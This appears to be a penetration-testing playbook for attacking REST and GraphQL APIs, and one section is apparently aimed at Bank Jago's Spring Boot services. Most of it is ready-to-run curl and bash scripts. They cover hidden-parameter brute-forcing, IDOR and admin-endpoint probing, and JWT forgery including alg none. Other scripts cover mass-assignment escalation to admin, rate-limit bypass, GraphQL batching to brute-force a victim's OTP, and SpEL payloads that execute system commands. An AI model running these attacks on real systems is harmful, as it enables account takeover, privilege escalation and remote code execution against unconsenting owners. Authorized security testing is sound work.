# API Fuzzing & Parameter Manipulation

Phase 6 reference. Systematic approach to discovering vulnerabilities in REST/GraphQL APIs through parameter fuzzing, boundary testing, and auth token manipulation.

---

## When to Use

- Phase 3: API endpoint discovery (light fuzzing for hidden params)
- Phase 5: Vuln assessment (automated scanning of discovered endpoints)
- Phase 6: Exploitation (targeted fuzzing of promising vectors)

---

## 1. Parameter Discovery

Before fuzzing, find all parameters an endpoint accepts — including undocumented ones.

### Techniques

| Method | Tool | Command |
|--------|------|---------|
| Arjun (dedicated param finder) | arjun | `arjun -u https://target.com/api/endpoint -m JSON` |
| Param wordlist brute-force | ffuf | `ffuf -u https://target.com/api/users -X POST -d '{"FUZZ":"test"}' -w params.txt -H "Content-Type: application/json"` |
| Response differential | manual | Add unknown params, compare response size/status |
| Swagger/OpenAPI extraction | curl+jq | Parse documented params, then test undocumented ones |
| Traffic analysis | Burp Logger | Observe all params in normal app usage |

### Hidden Parameter Wordlist (high-value targets)

```
id, user_id, uid, account_id, email, username, role, admin, is_admin,
isAdmin, permissions, group, group_id, org_id, tenant_id, debug, test,
verbose, internal, secret, token, api_key, apikey, key, password, pass,
pwd, old_password, new_password, confirm_password, otp, code, verify,
status, state, active, enabled, disabled, deleted, archived, version,
v, format, callback, redirect, redirect_uri, next, return_url, ref,
source, utm_source, page, limit, offset, sort, order, filter, search,
query, q, fields, include, exclude, expand, embed, populate, select,
with, depth, level, type, category, tag, label, priority, severity,
created_at, updated_at, expires, ttl, timeout, retry, force, skip,
override, bypass, raw, unsafe, allow, deny, block, whitelist, blacklist
```

### Response Differential Analysis

```bash
# Baseline: normal request
BASELINE=$(curl -sk -o /dev/null -w "%{size_download}:%{http_code}" \
  "https://target.com/api/users" -H "Authorization: Bearer $TOKEN")

# Fuzz: add each param and compare response
while read param; do
  RESP=$(curl -sk -o /dev/null -w "%{size_download}:%{http_code}" \
    "https://target.com/api/users?${param}=test" -H "Authorization: Bearer $TOKEN")
  if [ "$RESP" != "$BASELINE" ]; then
    echo "[DIFF] $param → $RESP (baseline: $BASELINE)"
  fi
done < params.txt
```

---

## 2. Data Type & Boundary Fuzzing

For every discovered parameter, test unexpected types and boundary values.

### Type Confusion Matrix

| Expected Type | Fuzz Values | What Breaks |
|---------------|-------------|-------------|
| Integer | `"string"`, `null`, `[]`, `{}`, `true`, `1.5`, `-1`, `0`, `99999999999`, `NaN`, `Infinity` | Type errors, overflow, negative logic |
| String | `123`, `null`, `true`, `[]`, `""`, very long string (10000+ chars), unicode, null bytes | Buffer issues, injection, truncation |
| Boolean | `"true"`, `"yes"`, `1`, `"1"`, `2`, `null`, `[]`, `""` | Truthy evaluation bypass |
| Array | `"string"`, `null`, `{}`, `[[]]`, empty `[]`, array with 10000 items | DoS, type confusion |
| Object | `null`, `[]`, `"string"`, nested 100 levels deep | Parser crash, prototype pollution |
| UUID | `00000000-0000-0000-0000-000000000000`, `../../../etc/passwd`, `1`, `admin`, SQL payload | IDOR, injection, path traversal |
| Email | `a@a`, `@`, `"@"@a.com`, very long local part, unicode, `admin@target.com` | Validation bypass, privilege escalation |
| Date | `0000-00-00`, `9999-12-31`, `2000-13-32`, `null`, epoch `0`, negative epoch | Logic errors, time travel |
| Enum | Out-of-range value, empty string, case variation, numeric equivalent | State bypass |

### Boundary Value Payloads

```json
// Integer boundaries
{"amount": 0}
{"amount": -1}
{"amount": 2147483647}          // INT32_MAX
{"amount": 2147483648}          // INT32_MAX + 1
{"amount": -2147483648}         // INT32_MIN
{"amount": 9007199254740992}    // JS MAX_SAFE_INTEGER + 1
{"amount": 0.0000001}
{"amount": 1e308}               // Near FLOAT64_MAX

// String boundaries
{"name": ""}                    // Empty
{"name": "A"}                   // Min
{"name": "A"*10000}            // Overflow
{"name": "A"*1048576}          // 1MB — DoS potential

// Array boundaries
{"ids": []}                     // Empty array
{"ids": [1]}                    // Single
{"ids": [1,2,3,...,10000]}     // Mass operation
{"ids": [-1, 0, 99999999]}    // Mixed invalid

// Null injection
{"field": null}
{"field": "null"}
{"field": "\u0000"}
{"field": "test\x00admin"}    // Null byte truncation
```

### Automated Type Fuzzing Script

```bash
#!/bin/bash
# Fuzz a JSON API parameter with type confusion payloads
URL="https://target.com/api/endpoint"
TOKEN="Bearer $JWT"
PARAM="amount"

PAYLOADS=(
  '{"'$PARAM'": "string"}'
  '{"'$PARAM'": null}'
  '{"'$PARAM'": true}'
  '{"'$PARAM'": false}'
  '{"'$PARAM'": []}'
  '{"'$PARAM'": {}}'
  '{"'$PARAM'": -1}'
  '{"'$PARAM'": 0}'
  '{"'$PARAM'": 99999999}'
  '{"'$PARAM'": 2147483648}'
  '{"'$PARAM'": 1.5}'
  '{"'$PARAM'": ""}'
  '{"'$PARAM'": "0"}'
  '{"'$PARAM'": "null"}'
  '{"'$PARAM'": "undefined"}'
  '{"'$PARAM'": "NaN"}'
  '{"'$PARAM'": [1,2,3]}'
  '{"'$PARAM'": {"nested": true}}'
)

echo "=== Type Fuzzing: $PARAM ==="
for payload in "${PAYLOADS[@]}"; do
  RESP=$(curl -sk -w "\n%{http_code}|%{size_download}" -X POST "$URL" \
    -H "Authorization: $TOKEN" \
    -H "Content-Type: application/json" \
    -d "$payload")
  STATUS=$(echo "$RESP" | tail -1 | cut -d'|' -f1)
  SIZE=$(echo "$RESP" | tail -1 | cut -d'|' -f2)
  BODY=$(echo "$RESP" | head -n -1)
  echo "[$STATUS|${SIZE}B] $payload"
  # Flag interesting responses
  if [[ "$STATUS" == "500" ]] || [[ "$STATUS" == "200" && "$SIZE" -gt 1000 ]]; then
    echo "  ^^^ INTERESTING — check response body"
    echo "  $BODY" | head -3
  fi
done
```

---

## 3. Authentication & Authorization Fuzzing

### Token Manipulation

| Technique | Payload | What to Find |
|-----------|---------|--------------|
| Remove auth header entirely | (no Authorization header) | Endpoints that don't check auth |
| Empty bearer | `Authorization: Bearer ` | Null token accepted |
| Invalid format | `Authorization: Bearer invalid` | Error message leaks info |
| Expired token | Use old JWT (change exp claim) | Token expiry not enforced |
| Other user's token | Swap tokens between accounts | Broken object-level auth |
| Modified claims | Change `role`, `sub`, `scope` in JWT | Broken function-level auth |
| Algorithm none | `{"alg":"none"}` + empty signature | Signature not verified |
| Self-signed | Generate own JWT with guessed/leaked secret | Weak secret |

### Horizontal Privilege Testing (BOLA)

```bash
# Systematic IDOR testing across all endpoints
# Requires: 2 accounts (user_a, user_b) with their tokens

ENDPOINTS=(
  "GET /api/users/{id}"
  "GET /api/users/{id}/profile"
  "GET /api/users/{id}/transactions"
  "PUT /api/users/{id}/settings"
  "DELETE /api/users/{id}/sessions"
  "GET /api/orders/{id}"
  "GET /api/documents/{id}"
)

USER_A_ID="123"
USER_B_ID="456"
USER_A_TOKEN="Bearer eyJ..."
USER_B_TOKEN="Bearer eyJ..."

for endpoint in "${ENDPOINTS[@]}"; do
  METHOD=$(echo $endpoint | cut -d' ' -f1)
  PATH=$(echo $endpoint | cut -d' ' -f2 | sed "s/{id}/$USER_B_ID/g")
  
  # Access user_b's resource with user_a's token
  RESP=$(curl -sk -o /dev/null -w "%{http_code}" -X $METHOD \
    "https://target.com$PATH" -H "Authorization: $USER_A_TOKEN")
  
  if [ "$RESP" == "200" ]; then
    echo "[VULN] $METHOD $PATH → 200 with wrong user's token (BOLA/IDOR)"
  else
    echo "[SAFE] $METHOD $PATH → $RESP"
  fi
done
```

### Vertical Privilege Testing (BFLA)

```bash
# Test admin endpoints with regular user token
ADMIN_ENDPOINTS=(
  "GET /api/admin/users"
  "POST /api/admin/users"
  "DELETE /api/admin/users/123"
  "GET /api/admin/config"
  "PUT /api/admin/settings"
  "GET /api/internal/metrics"
  "GET /api/internal/debug"
  "POST /api/admin/impersonate"
)

USER_TOKEN="Bearer eyJ..."  # Regular user

for endpoint in "${ADMIN_ENDPOINTS[@]}"; do
  METHOD=$(echo $endpoint | cut -d' ' -f1)
  PATH=$(echo $endpoint | cut -d' ' -f2)
  
  RESP=$(curl -sk -o /dev/null -w "%{http_code}|%{size_download}" -X $METHOD \
    "https://target.com$PATH" -H "Authorization: $USER_TOKEN" \
    -H "Content-Type: application/json")
  
  STATUS=$(echo $RESP | cut -d'|' -f1)
  SIZE=$(echo $RESP | cut -d'|' -f2)
  
  if [ "$STATUS" == "200" ] || [ "$STATUS" == "201" ]; then
    echo "[VULN] $METHOD $PATH → $STATUS (${SIZE}B) — BFLA!"
  elif [ "$STATUS" == "403" ]; then
    echo "[SAFE] $METHOD $PATH → 403"
  else
    echo "[CHECK] $METHOD $PATH → $STATUS (${SIZE}B)"
  fi
done
```

### Scope/Permission Escalation

```bash
# If JWT contains scope/permissions claims, test expansion
# Original token scope: "read:users"
# Forge token with: "read:users write:users admin:*"

# Step 1: Decode current token
echo "$JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null | jq .

# Step 2: Check if scope is enforced per-endpoint
# Use token with "read" scope on write endpoints
curl -sk -X POST "https://target.com/api/users" \
  -H "Authorization: Bearer $READ_ONLY_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"name":"test","email":"test@test.com"}'
# 200 = scope not enforced on this endpoint
```

---

## 4. Mass Assignment / Property Injection

Systematically discover writable properties that shouldn't be user-controllable.

### Discovery Methodology

```bash
# Step 1: GET the resource to see ALL returned fields
curl -sk "https://target.com/api/users/me" -H "Authorization: Bearer $TOKEN" | jq .
# Returns: {"id":1,"name":"user","email":"a@b.com","role":"user","verified":false,"credits":0}

# Step 2: Try PATCH/PUT with each non-obvious field
FIELDS=("role" "verified" "credits" "is_admin" "permissions" "account_type" "org_id")

for field in "${FIELDS[@]}"; do
  echo -n "Testing $field: "
  
  # Try string "admin" for role-like fields
  RESP=$(curl -sk -X PATCH "https://target.com/api/users/me" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d "{"$field":"admin"}" -w "\n%{http_code}")
  STATUS=$(echo "$RESP" | tail -1)
  
  if [ "$STATUS" == "200" ]; then
    echo "ACCEPTED (200) — verify if value changed"
    curl -sk "https://target.com/api/users/me" -H "Authorization: Bearer $TOKEN" | jq ".$field"
  elif [ "$STATUS" == "422" ] || [ "$STATUS" == "400" ]; then
    echo "PROCESSED but invalid value (field IS writable, try valid values)"
  else
    echo "$STATUS (likely ignored)"
  fi
done
```

### Registration Endpoint (often more permissive)

```bash
# Registration endpoints frequently accept more fields than update endpoints
curl -sk -X POST "https://target.com/api/register" \
  -H "Content-Type: application/json" \
  -d '{
    "name": "test",
    "email": "test@test.com",
    "password": "Test123!",
    "role": "admin",
    "is_admin": true,
    "verified": true,
    "credits": 999999,
    "org_id": "target-org-id"
  }'
```

---

## 5. Response Analysis & Error Mining

### Information Disclosure in Errors

```bash
# Trigger errors intentionally to extract info
# Invalid type → stack trace with framework/version
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"id": "not-a-number"}' | jq .

# Missing required field → reveals field names
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{}' | jq .

# SQL-like input → reveals database type
curl -sk "https://target.com/api/users?id=1'" | jq .

# Oversized input → reveals limits and middleware
curl -sk -X POST "https://target.com/api/users" \
  -H "Content-Type: application/json" \
  -d '{"name":"'$(python3 -c "print('A'*100000)")'"}'
```

### Verbose Error Indicators

| Error Pattern | Reveals |
|---------------|---------|
| `java.lang.NullPointerException` | Java backend, specific class path |
| `TypeError: Cannot read property` | Node.js, specific code path |
| `sqlalchemy.exc.OperationalError` | Python + SQLAlchemy + DB type |
| `SQLSTATE[42S02]` | PHP + MySQL, table doesn't exist |
| `ActiveRecord::RecordNotFound` | Ruby on Rails |
| `panic: runtime error` | Go backend |
| `Microsoft.Data.SqlClient` | .NET + MSSQL |
| Stack trace with file paths | Internal directory structure |
| `DEBUG = True` indicators | Django debug mode |

---

## 6. Rate Limiting & Business Logic Fuzzing

### Rate Limit Detection

```bash
# Determine rate limit threshold
for i in $(seq 1 200); do
  STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
    "https://target.com/api/endpoint" -H "Authorization: Bearer $TOKEN")
  if [ "$STATUS" == "429" ]; then
    echo "Rate limited at request #$i"
    # Extract retry-after
    curl -sk -D- "https://target.com/api/endpoint" -H "Authorization: Bearer $TOKEN" | grep -i "retry-after\|x-ratelimit"
    break
  fi
done
```

### Rate Limit Bypass Techniques

| # | Technique | Header/Method |
|---|-----------|---------------|
| 1 | IP rotation via headers | `X-Forwarded-For: 1.2.3.{N}` |
| 2 | IP rotation via headers | `X-Real-IP: 1.2.3.{N}` |
| 3 | IP rotation via headers | `X-Originating-IP: 1.2.3.{N}` |
| 4 | Case variation in path | `/api/Users` vs `/api/users` vs `/API/USERS` |
| 5 | Trailing characters | `/api/users/` vs `/api/users` vs `/api/users?` |
| 6 | HTTP method change | GET → POST (or vice versa) |
| 7 | API version change | `/v1/users` → `/v2/users` |
| 8 | Parameter pollution | Add dummy param: `/api/users?foo=bar` |
| 9 | Encoding variation | `/api/%75sers` (URL-encoded 'u') |
| 10 | GraphQL batching | Send N queries in single request |
| 11 | HTTP/2 multiplexing | Parallel streams in single connection |
| 12 | Null byte in path | `/api/users%00` |

```bash
# Automated bypass testing
ENDPOINT="https://target.com/api/login"
BODY='{"email":"test@test.com","password":"wrong"}'

echo "=== Rate Limit Bypass Testing ==="
for i in $(seq 1 10); do
  # X-Forwarded-For rotation
  curl -sk -o /dev/null -w "XFF 10.0.0.$i: %{http_code}\n" -X POST "$ENDPOINT" \
    -H "Content-Type: application/json" \
    -H "X-Forwarded-For: 10.0.0.$i" \
    -d "$BODY"
done

# Path variation
for path in "/api/login" "/api/login/" "/api/Login" "/API/LOGIN" "/api/login?" "/api/%6cogin"; do
  curl -sk -o /dev/null -w "$path: %{http_code}\n" -X POST "https://target.com$path" \
    -H "Content-Type: application/json" -d "$BODY"
done
```

---

## 7. Content-Type Manipulation

APIs may process different content types with different parsers (and different security controls).

### Content-Type Switching

```bash
ENDPOINT="https://target.com/api/users"
DATA_JSON='{"username":"admin","password":"test"}'

# Original (JSON)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/json" -d "$DATA_JSON"

# Switch to form-urlencoded
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admin&password=test"

# Switch to XML (may enable XXE)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: application/xml" \
  -d '<?xml version="1.0"?>
<root><username>admin</username><password>test</password></root>'

# Switch to multipart (may bypass body size limits or WAF)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: multipart/form-data" \
  -F "username=admin" -F "password=test"

# No content-type (parser may default to something unexpected)
curl -sk -X POST "$ENDPOINT" -d "$DATA_JSON"

# text/plain (CORS simple request — no preflight!)
curl -sk -X POST "$ENDPOINT" -H "Content-Type: text/plain" -d "$DATA_JSON"
```

### Why This Matters

- JSON parser may sanitize input; XML parser may not (XXE)
- WAF rules often target specific Content-Type
- Form-urlencoded may enable parameter pollution (`key=val1&key=val2`)
- `text/plain` with JSON body = CORS simple request (no preflight = CSRF possible)
- Some frameworks auto-detect content type and parse accordingly

---

## 8. Microservice-Specific Fuzzing (Spring Boot / Java)

Relevant for Bank Jago's architecture.

### Actuator Endpoint Fuzzing

```bash
# Beyond standard /actuator paths, test:
ACTUATOR_PATHS=(
  "/actuator" "/actuator/env" "/actuator/health" "/actuator/info"
  "/actuator/mappings" "/actuator/beans" "/actuator/configprops"
  "/actuator/heapdump" "/actuator/threaddump" "/actuator/loggers"
  "/actuator/metrics" "/actuator/scheduledtasks" "/actuator/httptrace"
  "/actuator/caches" "/actuator/conditions" "/actuator/flyway"
  "/actuator/liquibase" "/actuator/sessions" "/actuator/shutdown"
  "/manage/health" "/manage/env" "/manage/info"  # Alternative base path
  "/admin/health" "/admin/env"  # Another alternative
)

# Test with auth token (actuator may be auth-gated but accessible with any valid token)
for path in "${ACTUATOR_PATHS[@]}"; do
  RESP=$(curl -sk -o /dev/null -w "%{http_code}|%{size_download}" \
    "https://target.com$path" -H "Authorization: Bearer $TOKEN")
  STATUS=$(echo $RESP | cut -d'|' -f1)
  SIZE=$(echo $RESP | cut -d'|' -f2)
  if [ "$STATUS" == "200" ] && [ "$SIZE" -gt 50 ]; then
    echo "[EXPOSED] $path → $STATUS (${SIZE}B)"
  fi
done
```

### Spring Expression Language (SpEL) Injection

```bash
# Test in any parameter that might be evaluated as expression
SPEL_PAYLOADS=(
  '${7*7}'
  '#{7*7}'
  '${T(java.lang.Runtime).getRuntime().exec("id")}'
  '#{T(java.lang.Runtime).getRuntime().exec("id")}'
  '${applicationContext}'
  '__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x'
)

for payload in "${SPEL_PAYLOADS[@]}"; do
  echo -n "SpEL [$payload]: "
  curl -sk -o /dev/null -w "%{http_code}" \
    "https://target.com/api/search?q=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")" \
    -H "Authorization: Bearer $TOKEN"
  echo ""
done
```

---

## 9. GraphQL-Specific Fuzzing

### Introspection (even when "disabled")

```bash
# Standard introspection
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name,fields{name,type{name}}}}}"}'

# If blocked, try:
# 1. GET method
curl -sk "https://target.com/graphql?query={__schema{types{name}}}"

# 2. Different content type
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d 'query={__schema{types{name}}}'

# 3. Newline/whitespace obfuscation
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{\n__schema{\ntypes{\nname\n}\n}\n}"}'

# 4. Field suggestion abuse (when introspection is off)
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{us}"}'
# Error: "Did you mean 'user'? 'users'? 'userSettings'?"
```

### Batching for Rate Limit Bypass

```bash
# Single request, multiple operations (bypasses per-request rate limiting)
curl -sk -X POST "https://target.com/graphql" \
  -H "Content-Type: application/json" \
  -d '[
    {"query":"mutation{login(email:\"victim@test.com\",otp:\"0001\"){token}}"},
    {"query":"mutation{login(email:\"victim@test.com\",otp:\"0002\"){token}}"},
    {"query":"mutation{login(email:\"victim@test.com\",otp:\"0003\"){token}}"},
    {"query":"mutation{login(email:\"victim@test.com\",otp:\"0004\"){token}}"},
    {"query":"mutation{login(email:\"victim@test.com\",otp:\"0005\"){token}}"}
  ]'
```

### Alias-Based Enumeration

```graphql
# Enumerate users without triggering per-query rate limits
{
  u1: user(id: "1") { email name role }
  u2: user(id: "2") { email name role }
  u3: user(id: "3") { email name role }
  u4: user(id: "4") { email name role }
  u5: user(id: "5") { email name role }
}
```

---

## 10. Fuzzing Decision Tree

```
API Endpoint Discovered
├── Is it authenticated?
│   ├── NO → Test all HTTP methods (GET/POST/PUT/PATCH/DELETE)
│   │   └── Any return 200/201? → CRITICAL (unauth write)
│   └── YES → Proceed with valid token
│
├── What parameters does it accept?
│   ├── Documented (Swagger/OpenAPI) → Test undocumented params too
│   ├── Discovered (Arjun/traffic) → Test type confusion on each
│   └── Unknown → Param wordlist brute-force
│
├── For each parameter:
│   ├── Test type confusion (string→int, null, array, object)
│   ├── Test boundary values (0, -1, MAX_INT, empty, very long)
│   ├── Test injection (SQLi, NoSQLi, SpEL, SSTI markers)
│   └── Test access control (other user's ID, admin values)
│
├── For the endpoint overall:
│   ├── Test Content-Type switching (JSON→XML→form→multipart)
│   ├── Test rate limiting and bypass techniques
│   ├── Test mass assignment (add fields from GET response to PUT/PATCH)
│   └── Test HTTP method override headers
│
└── Document all anomalies:
    ├── Different response size = parameter processed
    ├── 500 error = potential crash/injection
    ├── Stack trace = info disclosure
    └── Unexpected 200 = auth/logic bypass
```

---

## Tools

| Tool | Purpose | Install |
|------|---------|---------|
| ffuf | Parameter/path fuzzing | `brew install ffuf` |
| Arjun | Hidden parameter discovery | `pip install arjun` |
| Burp Intruder | Targeted parameter fuzzing | Burp Suite Pro |
| Postman | API exploration + collection runner | Desktop app |
| jwt_tool | JWT manipulation | `pip install jwt_tool` |
| GraphQL Voyager | Schema visualization | Web-based |
| Kiterunner | API endpoint brute-force | `go install github.com/assetnote/kiterunner/cmd/kr@latest` |
